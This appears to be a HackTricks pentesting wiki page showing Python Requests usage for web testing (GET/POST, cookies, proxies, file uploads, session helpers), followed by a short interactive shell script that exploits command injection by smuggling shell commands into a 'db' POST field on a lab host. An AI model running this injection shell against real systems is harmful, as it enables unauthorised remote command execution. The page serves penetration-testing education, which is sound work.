# Web Requests

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

These examples use Requests' documented request arguments, response properties, multipart file tuples, and sessions.<sup>[[1]](#references)</sup> The `verify=False` examples disable TLS certificate verification and should be limited to controlled testing.<sup>[[1]](#references)</sup>

```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
    resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
    return resp

def login(username, password):
    resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
    return resp

def get_info(name):
    resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
    guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
    return guid

def upload(guid, filename, data):
    resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
    guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
    return guid

def json_search(guid, search_string):
    resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
    return resp.json()

def get_random_string(guid, path):
    return ''.join(random.choice(string.ascii_letters) for i in range(10))
```

## Python cmd to exploit an RCE

The command loop subclasses Python's `Cmd`; its `default` method handles unrecognized command prefixes, `cmdloop` dispatches input lines, and `re.DOTALL` lets the extraction pattern span newlines.<sup>[[2]](#references)[[3]](#references)</sup>

```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
    prompt = "Inject => "

    def default(self, args):
        output = RunCmd(args)
        print(output)

def RunCmd(cmd):
    data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
    r = requests.post('http://10.10.10.127/select', data=data)
    page = r.text
    m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
    if m:
        return m.group(1)
    else:
        return 1


term = Terminal()
term.cmdloop()
```

## References

- [1] [Requests Developer Interface](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Support for line-oriented command interpreters](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Regular expression operations](https://docs.python.org/3/library/re.html)

{{#include ../../banners/hacktricks-training.md}}
